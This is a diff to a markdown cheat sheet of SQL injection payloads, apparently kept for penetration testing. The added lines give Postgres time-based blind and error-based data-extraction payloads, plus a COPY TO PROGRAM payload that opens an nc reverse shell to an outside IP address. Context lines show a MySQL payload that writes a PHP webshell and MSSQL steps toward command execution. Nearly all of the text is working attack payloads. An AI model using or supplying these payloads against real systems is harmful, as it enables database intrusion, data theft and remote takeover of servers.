@@ -130,6 +130,9 @@ Include # to comment out code behind
 ### MSSQL Blind
 	INJECTION;waitfor delay '0:0:3';
 
+### Postgres Blind
+	INJECTION;select pg_sleep(3)--
+
 ## SQL info extraction
 ### list db
 	select schema_name from information_schema.schemata
@@ -149,6 +152,10 @@ to reference a table, use `db.table`
 	select column_name, data_type from db.information_schema.columns where table_name='table'
 to reference a table, use `db.dbo.table`  
 
+### postgresql error output
+	INJECTION'; DO $$ BEGIN RAISE EXCEPTION '%', (SELECT string_agg(datname, ', ') FROM pg_database);END; $$;-- - 
+if site only shows output on error, use this to run queries and output it as error. String_agg concats all rows
+
 ## SQL to shell
 ### mssql
 	EXECUTE sp_configure 'show advanced options', 1;
@@ -159,7 +166,10 @@ to reference a table, use `db.dbo.table`
 
 ### mysql
 	INJECTION' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/tmp/webshell.php"; -- - 
-Disk location must be writable. Find a way to execute the php file
+Disk location must be writable. Find a way to execute the php file  
+
+### postgres
+	'; COPY (SELECT '') to program 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 123.123.123.1 4444 >/tmp/f';-- - 
 
 ## SQL Misc
 ### mssqlpwner
